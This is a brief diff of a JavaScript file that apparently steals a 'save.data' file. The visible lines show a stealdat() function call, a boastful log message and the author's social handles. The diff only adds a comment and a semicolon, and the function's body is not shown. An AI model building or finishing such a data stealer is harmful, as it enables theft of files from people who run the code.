@@ -8,6 +8,7 @@ Only fools trade(buy/sell) this Code.
 - All risks are in your hands.
 ***/
 
+/*** Get Started ***/
 console.log("Get ready.. we'll stole a save.data :D")
 const os = require('os');
 const { 
@@ -39,7 +40,7 @@ function stealdat () {
   }
 }
 // now we do a:
-stealdat() // done :)
+stealdat();
 
 /*Discord: .FrenzySG.#2331 (not-respond-for-dm)
 Instagram: frenzy.666 (respond-to-a-dm)*/
